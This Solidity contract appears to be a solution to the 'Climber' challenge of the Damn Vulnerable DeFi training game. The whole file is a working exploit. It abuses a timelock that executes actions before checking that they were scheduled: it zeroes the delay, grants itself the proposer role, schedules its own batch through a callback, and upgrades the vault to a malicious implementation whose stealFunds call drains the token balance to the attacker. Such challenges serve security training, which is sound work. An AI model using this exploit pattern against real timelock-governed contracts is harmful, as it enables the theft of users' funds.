// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ClimberAttackerVault.sol";
import "../Attacker.sol";
import "./ClimberVault.sol";
import "./ClimberTimelock.sol";


contract ClimberAttacker is Attacker {
    
    // Constants for has savings:
    uint private constant VAULT_BALANCE = 10000000 * 10 ** 18;
    bytes32 private constant CALLBACK_EXPLOIT_SALT = bytes32("Damn Vulnerable Defi");

    // external interactions:
    ClimberVault private immutable vault;
    IERC20 private immutable token;
    ClimberTimelock private immutable timelock;

    // The upgraded attacker vault:
    ClimberVaultAttacker private immutable attackerVault;

    // Arrays for the executed actions:
    address[] private addresses = new address[](4);
    uint[] private values = new uint[](4);
    bytes[] private data = new bytes[](4);

    constructor(address _vault, address _token, address payable _timelock) {
        address _this = address(this);
        
        // External contracts
        vault = ClimberVault(_vault);
        token = IERC20(_token);
        timelock = ClimberTimelock(_timelock);

        // Future upgraded vault
        attackerVault = new ClimberVaultAttacker();

        // Setup arrays
        addresses[0] = _timelock;
        addresses[1] = _timelock;
        addresses[2] = _this;
        addresses[3] = _vault;

        // Setting the delay of the action scheduler to 0 seconds:
        data[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);

        // Granting the PROPOSER_ROLE to the attacker contract:
        data[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, _this);

        // Scheduling the executed actions so that they do not get reverted:
        data[2] = abi.encodeWithSelector(this.callbackExploit.selector);

        // Upgrading the vault to a malicious contract and calling the stealFunds function that we implemented to drain all of the funds:
        bytes memory _stealFundsHash = abi.encodeWithSelector(attackerVault.stealFunds.selector, _token, owner(), VAULT_BALANCE);
        data[3] = abi.encodeWithSelector(vault.upgradeToAndCall.selector, address(attackerVault), _stealFundsHash);
    }

    function startAttack() external override onlyOwner {
        // Executing the 4 actions in a single transaction:
        timelock.execute(addresses, values, data, CALLBACK_EXPLOIT_SALT);
    }

    function callbackExploit() external {
        // Schedule the 4 actions so they do not get reverted:
        timelock.schedule(addresses, values, data, CALLBACK_EXPLOIT_SALT);
    }

}